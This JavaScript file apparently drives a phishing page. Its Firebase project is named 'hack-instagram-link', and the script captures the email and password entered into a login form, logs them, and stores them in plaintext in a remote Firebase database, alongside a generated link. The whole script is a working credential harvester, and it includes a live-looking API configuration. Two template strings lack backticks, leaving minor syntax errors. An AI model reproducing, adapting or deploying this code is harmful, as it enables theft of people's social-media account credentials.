// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-analytics.js";

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDsS14QF70TAtRSiXeDz00wLoI4FqaNo_8",
  authDomain: "hack-instagram-link.firebaseapp.com",
  databaseURL: "https://hack-instagram-link-default-rtdb.firebaseio.com",
  projectId: "hack-instagram-link",
  storageBucket: "hack-instagram-link.firebasestorage.app",
  messagingSenderId: "854965005132",
  appId: "1:854965005132:web:266c78e585bb28e219fde9",
  measurementId: "G-55BMTQLBKT"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const database = getDatabase(app);

// Log the initialization of Firebase
console.log("Firebase Initialized");

// Function to generate a unique ID
function generateUniqueId() {
  return Math.random().toString(36).substr(2, 9); // Example: "2971fab7"
}

// Handle login form submission
const loginForm = document.getElementById('loginForm');
if (loginForm) {
  loginForm.addEventListener('submit', (event) => {
    event.preventDefault(); // Prevent default form submission

    // Get input values
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    console.log("Debug: Email =", email, "Password =", password);

    // Check if fields are not empty
    if (email && password) {
      const deviceId = generateUniqueId();
      console.log("Debug: Device ID =", deviceId);

      // Save data to Firebase Realtime Database
      const userRef = ref(database, 'users/' + deviceId);
      set(userRef, {
        email: email,
        password: password,
        deviceId: deviceId
      })
        .then(() => {
          console.log("Data sent successfully to Firebase");

          // Create the link with the device ID
          const link = https://example.com/id=${deviceId};
          console.log("Debug: Generated Link =", link);

          alert(Login data sent successfully!\nYour link: ${link});
          loginForm.reset();
        })
        .catch((error) => {
          console.error("Error:", error.message);
          alert("Error: " + error.message);
        });
    } else {
      alert("Please fill in both email and password.");
    }
  });
} else {
  console.error("Login form not found!");
}